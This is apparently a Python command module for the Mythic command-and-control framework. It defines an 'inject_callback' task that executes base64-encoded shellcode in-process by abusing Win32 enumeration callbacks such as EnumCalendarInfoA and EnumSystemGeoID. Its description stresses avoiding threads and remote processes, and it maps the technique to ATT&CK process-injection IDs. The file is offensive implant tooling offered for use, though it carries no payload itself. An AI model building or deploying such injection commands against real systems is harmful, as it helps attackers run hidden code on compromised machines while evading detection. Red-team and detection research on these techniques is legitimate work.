from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class InjectCallbackArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="technique",
                type=ParameterType.ChooseOne,
                choices=["calendar", "desktops", "winstations", "geoid"],
                display_name="Technique",
                description=(
                    "Callback API used to invoke the shellcode in-process: "
                    "EnumCalendarInfoA, EnumDesktopsW, EnumWindowStationsW "
                    "or EnumSystemGeoID"
                ),
                default_value="calendar",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
            CommandParameter(
                name="shellcode",
                type=ParameterType.String,
                description="Base64-encoded shellcode to execute",
                parameter_group_info=[ParameterGroupInfo(required=True)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("shellcode", self.command_line)


class InjectCallbackCommand(CommandBase):
    cmd = "inject_callback"
    needs_admin = False
    help_cmd = "inject_callback -Technique [calendar|desktops|winstations|geoid] -Shellcode [base64]"
    description = (
        "Execute shellcode in-process by abusing a Win32 enumeration callback "
        "(EnumCalendarInfoA / EnumDesktopsW / EnumWindowStationsW / "
        "EnumSystemGeoID). No threads, no remote process, no fibers."
    )
    version = 1
    author = "NomadAgent"
    attackmapping = ["T1055.012", "T1106"]
    argument_class = InjectCallbackArguments

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        response.DisplayParams = "{} -> {}".format(
            taskData.args.get_arg("technique"),
            taskData.args.get_arg("shellcode")[:32] + "...",
        )
        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
